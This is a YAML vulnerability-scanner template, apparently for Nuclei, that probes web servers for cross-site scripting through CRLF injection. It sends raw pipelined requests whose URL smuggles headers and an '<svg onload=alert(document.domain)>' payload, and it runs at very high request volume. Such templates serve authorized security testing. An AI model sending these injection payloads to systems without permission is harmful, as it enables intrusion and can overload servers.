id: XSS_CRLF_Injection
info:
  author: 51pwn
  name: XSS_CRLF_Injection
  reference:
  - https://hackerone.com/reports/192749
  - https://51pwn.com
  severity: critical
  tags: xss,crlf,injection
requests:
- cookie-reuse: true
  matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - <svg onload=alert(document.domain)>
  matchers-condition: and
  pipeline: true
  pipeline-concurrent-connections: 40
  pipeline-requests-per-connection: 25000
  raw:
  - 'GET /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
    HTTP/1.1

    Host: {{Hostname}}

    Accept:*/*

    Pragma:no-cache

    User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/97.0.4692.71 Safari/537.36


    '
  - 'GET /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
    HTTP/1.1

    Host: {{Hostname}}

    Accept:*/*

    Connection: keep-alive

    Pragma:no-cache

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 0

    User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/97.0.4692.71 Safari/537.36


    '
  req-condition: true
  unsafe: true
